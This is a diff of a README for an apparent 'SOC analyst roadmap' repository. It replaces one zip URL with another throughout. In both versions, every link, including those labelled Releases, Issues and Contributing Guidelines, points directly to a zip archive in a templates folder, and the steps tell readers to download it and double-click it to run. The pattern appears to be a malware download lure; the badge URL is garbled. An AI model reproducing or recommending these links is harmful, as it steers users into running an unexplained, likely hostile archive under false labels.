@@ -1,6 +1,6 @@
 # 🎓 soc-roadmap-2026 - Your Path to SOC Analyst Mastery
 
-[![Download Now](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip%20Now-%20https%3A%2F%https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip%2Far157209%2Fsoc-roadmap-2026%2Freleases-blue)](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
+[![Download Now](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip%20Now-%20https%3A%2F%https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip%2Far157209%2Fsoc-roadmap-2026%2Freleases-blue)](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
 
 ## 📋 Description
 
@@ -20,7 +20,7 @@ Before you proceed, ensure your computer meets the following requirements:
 
 ### Step 2: Visit the Releases Page
 
-Go to our [Releases page](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip) to find all available versions of the application.
+Go to our [Releases page](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip) to find all available versions of the application.
 
 ## 📥 Download & Install
 
@@ -28,7 +28,7 @@ Go to our [Releases page](https://github.com/ar157209/soc-roadmap-2026/raw/refs/
 
 You can download files from the Releases page. Click on the link below to start your download:
 
-[Download Now](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
+[Download Now](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
 
 ### Step 3: Select Your Download
 
@@ -36,14 +36,14 @@ On the Releases page, you will see a list of available versions. Choose the late
 
 ### Step 4: Download the File
 
-Click on the desired version to download. If you see a file named `https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip`, download it to your preferred location on your computer.
+Click on the desired version to download. If you see a file named `https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip`, download it to your preferred location on your computer.
 
 ### Step 5: Extract the Files
 
 Once the file is downloaded:
 
 1. Navigate to the folder where you downloaded the file.
-2. Right-click on `https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip`.
+2. Right-click on `https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip`.
 3. Select "Extract All" and choose a location to save the extracted files.
 
 ### Step 6: Run the Application
@@ -51,7 +51,7 @@ Once the file is downloaded:
 After extracting the files:
 
 1. Locate the extracted folder.
-2. Double-click on `https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip` (for Windows) or the equivalent application for your OS.
+2. Double-click on `https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip` (for Windows) or the equivalent application for your OS.
 3. Follow the instructions on the screen to begin exploring and working on the projects.
 
 ## 🛠️ Project Features
@@ -70,17 +70,17 @@ These projects are designed to be accessible for users with varying levels of ex
 
 If you face any issues during the download or installation process, feel free to reach out via the GitHub Issues section of this repository. Our community and maintainers are here to help you:
 
-- Visit the [Issues page](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip) to submit your query or view past issues.
+- Visit the [Issues page](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip) to submit your query or view past issues.
 
 ## 🌟 Community Contributions
 
-We encourage community involvement. If you'd like to contribute to this project or suggest improvements, please visit our [Contributing Guidelines](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip) for more information.
+We encourage community involvement. If you'd like to contribute to this project or suggest improvements, please visit our [Contributing Guidelines](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip) for more information.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
-- [Issues Page](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
-- [Contributing Guidelines](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
+- [Releases Page](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
 
 ## 📄 License
 
@@ -90,4 +90,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 Remember, becoming a SOC analyst takes practice and dedication. Take your time with each project, and don’t hesitate to seek help if needed. Happy learning!
 
-[Download Now](https://github.com/ar157209/soc-roadmap-2026/raw/refs/heads/main/templates/roadmap-soc-cupronickel.zip)
+[Download Now](https://raw.githubusercontent.com/ar157209/soc-roadmap-2026/main/templates/roadmap_soc_v2.4-beta.3.zip)
